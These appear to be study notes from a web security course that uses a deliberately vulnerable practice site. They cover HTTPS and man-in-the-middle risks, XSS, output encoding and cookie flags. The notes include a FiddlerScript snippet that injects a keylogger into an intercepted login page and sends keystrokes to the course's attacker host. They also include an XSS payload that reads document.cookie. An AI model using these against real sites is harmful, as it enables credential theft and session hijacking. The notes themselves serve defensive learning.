------------------------------------
Introduction
------------------------------------

Websites for course:

	- http://attacker.hackyourselffirst.troyhunt.com/
	- http://hackyourselffirst.troyhunt.com/

Chrome developper tool vs fiddler:
	- Fiddler behave like a HTTP proxy (sits between browser and the website)

Burp like inspector (inspector 21 add-on for fiddler 2)

------------------------------------
Transport Layer Protection
------------------------------------

Transport Layer Protection (HTTPS, SSL, etc.)
	- This is related to the man in the middle attack

	- 3 objectives:
		- Authenticity: Connecting to who? Garanty of identity?
		- Integrity: Request haven't been manipulated? Response haven't been manipulated?
		- Confidentiality: Eaves dropping? (Kept private?)

Man in the middle
	- Observe/modify a communication

Persisting authentification state via cookies
	- HTTP is state less
	- Auth cookie (Authentication cookie)
		- Is in the response of the authentication from the server
		- All subsequent requests (any requests) from the client includes the auth cookie so that the server always know who the requestor is.

Auth cookie via unsecure connection
	- If an attacker can intercept the auth cookie on unsecure request, it can reproduce any requests and receive a valid response (and therefor to be logged in)
	- It only takes one request so that the auth cookie is vulnarable and the attacker could highjack the session

Loading login forms over HTTP
	A login:
		- <insecure>(Request login in HTTP -> Login response in HTTP) -> <secure>(After that credentials are posted in HTTPS -> Response in HTTPS)
	- So, we atteck the form itself instead of the POST request (which is encrypted)

	In the OnBeforeResponse method in the FiddlerScript tab:

        if(oSession.HostnameIs("http://hackyourselffirst.troyhunt.com") && oSession.PathAndQuery == "/Account/Login") {
            // Remove any compression or chunking
            oSession.utilDecodeResponse();
            
            var oBody = System.Text.Encoding.UTF8.GetString(oSession.requestBodyBytes);

            // Inject the keylogger into the page
            oBody = oBody.Replace("</body>", "<script type=\"text/javascript\" src=\"http://attacker.hackyourselffirst.troyhunt.com/Scripts/keylogger.js\"></script><script type=\"text/javascript\">destination='http://attacker.hackyourselffirst.troyhunt.com/Keylogger/?k=';</script></body>");

            oSession.utilSetResponseBody(oBody);
        }

    	- An attacker can do that at any time on an unsecure connection
    	- Over HTTPS, an attacker can't modify the loggin page

Exploiting mixed-mode content: Loading a secure page
	All assets must be loaded securely to have the site secure
	For example: An HTTP ajax call in an HTTPS website.
		- To apply the correct scheme, : <script src="//ajax.googleapis/com[..]">
			- Automatically switch to secure/unsecure depending of the context

HSTS header (HTTP Strict Transport Security)(This a mititgation to have only HTTPS request)
	- It forces request from the browser to only be made over secure connection under specified circusmtences
	- For example: http://hackyourselffirst.troyhunt.com/Content/site.css contains the AuthCookie ...
		Response can contain Strict-Transport-Security: max-age=1440 (in minutes). This means that chrome cannot emit HTTP request to this site for the next day. If we do, it will be converted into a HTTPS request.

Summary
	- SSL is more than just encryption (the 3 objectives above)
	- Many points to do a man in the middle
	- If you need SSL, you also need to use it correctly (no sensitive cookies over HTTP, don't use HTTP to load the forms, do not embed insecure content in secure page (mixed content))
	- HSTS additional safety net

------------------------------------
Cross Site Scripting (XSS)
------------------------------------

Introduction
	- Untrusted data and sanitisation
	- Sanitisation practices
	- What is XSS?

Understanding untrusted data and sanitisation
	- What constitutes untrusted data? : 
		Integrity not verifiable, intent may be malicious (SQL injection, XSS, binary with malware, etc.)
	- Can come from the user (from a form, in the url, etc.)
	- Can come from the browser (cookies, request headers)
	- Can come from an external web service, our own DB (if you accepted untrusted data), etc.

The use of input sanitisation
	- Filter for what is acceptable or not
		- Like rejecting <>'/"\, etc.
			- This is blacklisting the characters. Rudementry, has holes
			- This is what we don't want today, can change over time
		- The whitelist is lower risk approach and is very explicit (can use regex for example)
	- Example, some website sanitized only on < since "without it, the nthis is not HTML tag"
		- This is why blacklisting is difficult and risky

Understanding reflected untrusted data
	- Typical request with untrusted data:
		- user request resource with untrusted data -> server response the data is reflected in the response (like the search in the demo: you searched for: '[...]'). It is how you can identify an XSS risk
	- For the site:
		- Request: <trusted>(www.mysite.com/Search?q=)<untrusted>(ferrari)
		- Response: <trusted>(you searched for <strong>)<untrusted>(ferrari)<trusted>(</strong>)

		Example:
			http://hackyourselffirst.troyhunt.com/Search?searchTerm=ferrari<i>enzo</i>
			you searched for <strong><i>ferrari</i></strong>
	- Then can inject different text, or even JS (executable stuff)

Output encoding concepts
	- An other protection against XSS, other than sanitization, is to display the reflecting data exactly as it was given by the user on the screen rather then reflected in the markup (the url)
	- Output encoding context can change the encoding
		For example, for <: HTML: &lt;
							CSS: \<
							JS: \x3ci\x3
							...
    - WHAT YOU SEE IN THE DEV TOOL IS MORE REPRESENTATIVE THEN WHAT IS REPRESENTED IN THE DOM
    	 For example in the site: / in a search term is in fact &#47; in the dev tool source code, html source is a better representation of what is returned by the server

We looked at reflected XSS, another is persistent XSS
	It is what is already in the DB
		For example, it has been saved by a user, and when loaded it does bad things

X-XSS-Protection header
	- Browser embeded protection against XSS
	- As a developper, you cannot rely on that. That is a bonus.
	- For example: in the response header: X-XSS-Protection:0 (value 0 means disable)
		- X means it is a non http standard header
	- Why to disable this? Their where cases where X-XSS could cause problems to some applications

Summary
	- Sanitization is first line of defence against XSS (holes can be easy to find, espacially with blacklisting)
	- Ouput encoding is critical for mitigating the risk of XSS
	- Don't trust your own data (often-overlooked threat)
	- Browser defences is additional, don't rely on it

------------------------------------
Cookies
------------------------------------

Cookies 101
	There are just a piece of text stored in the browser

	The server can set cookies via HTTP response header or can be setted via JS directly in the DOM
	Cookies are automatically passed back to the website in the header of each request
		GET http://site.com/ HTTP/1.1
		Cookie: name=value

	HTTP cookie exchange:
		request -> ser respond with set-cookie header -> subsequent requests automatically send the cookie

Cookie security:
		- Cookies frequently contain data of a sensitive nature
		- Browsers have some native defenses for cookie (same domain), but does not protect against XSS to have cookies
		- Can be more secured by tuning their attributes

	Cookie attributes
		Domain
		Path
		Expiration
		HttpOnly
		Secure

	If AuthCookie not flaged as HTTP, then it is accessible by client script. (Risk of session highjack)

	For example: seach term on unsecure website: ');alert(document.cookie);//

	This flag is set in the response header (HttpOnly)

	This is an easy mitigation that is quite easy to add a gives a good security protection (should still sanitize though)

Understanding secure cookies
	Flag cookies as secure:
		The AuthCookie won't be visible over HTTP (for example, when you get an image). The secure flag makes the browser do not send the AuthCookie over HTTP.

		But that mean you can never make a HTTP authentification.

	For AuthCookie, we want HTTP flag for no access by client and secure flag for HTTPS only.

Restricting cookie access by path.
	In Chrome dev. tool, you can see the Path on which the cookies will be sent (Resources -> Cookies -> Path). If path is / , then they will be sent we every request (images, page, etc.) even if they don't need them.

	On log off, the Password and the Email cookies are not cleared, for automatic log in.

	If a string end by a =, it is a sign that it is probably encoded in base64. (There is base64 decoding, so this is not cryptography persay)

Reducing risk with cookie expiration
	XSS, clickjack attacks, etc, can take place when the cookies are active.

	Need to find the right balance between convinience and security

	In dev. tool. you can see the expiration date of cookies.

Using session cookies to further reduce risk
	The AuthCookie expiration can be set to session. It will be a session cookie, therefore, when the browser closes, the cookie is discarded (ex: Banking)

	There is always a trade between usability and security.

Summary
	- 3rd party lib are often in HTTP
	- HttpOnly is an essential flag for a cookie that is not nescessary via client script

------------------------------------
Internal Implementation Disclosure
------------------------------------

